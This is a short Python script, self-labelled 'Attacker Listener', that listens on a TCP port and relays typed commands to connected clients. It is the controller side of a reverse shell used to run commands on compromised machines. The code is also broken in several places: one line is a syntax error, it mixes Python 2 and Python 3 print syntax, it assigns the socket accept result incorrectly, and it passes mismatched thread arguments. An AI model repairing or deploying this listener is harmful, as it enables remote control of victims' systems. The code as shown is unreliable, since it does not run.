import sys
import socket
import argparse
import threading

client = {}


def client_serve(client):
    """

    :type client: object
    """
    try:
        print(" Enter a command to execute")
        input = sys.stdin.read()
        client.send(input)
        while True:
            received data = client.recv[4096]
            print received_data
            input = raw_input("")
            input+="\n"
            client.send(input)
    except:
        print("Client Closed Connection")
        pass
    


def server_listen(port_number):
    target_host = "0.0.0.0"
    listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    listener.bind((target_host,port_number))
    listener.listen(25)
    print(" Server is listening on port " + str(port_number) + "....")
    while True:
        client.addr = listener.accept()
        print("Incoming connection from %s:%d " % (addr[0],addr[1]))
        client[addr[0]] = client
        client_serve_thread = threading.Thread(target=client_serve,args=(client,1))
        client_serve_thread.start()
        


def main():
    parser = argparse.ArgumentParser(" Attacker Listener")
    parser.add_argument("-p","--port",type=int,help="Port Number to be connected with",default=9999)
    args = parser.parse_args()
    port_number = args.port
    server_listen(port_number)

if __name__ == '__main__':
    main()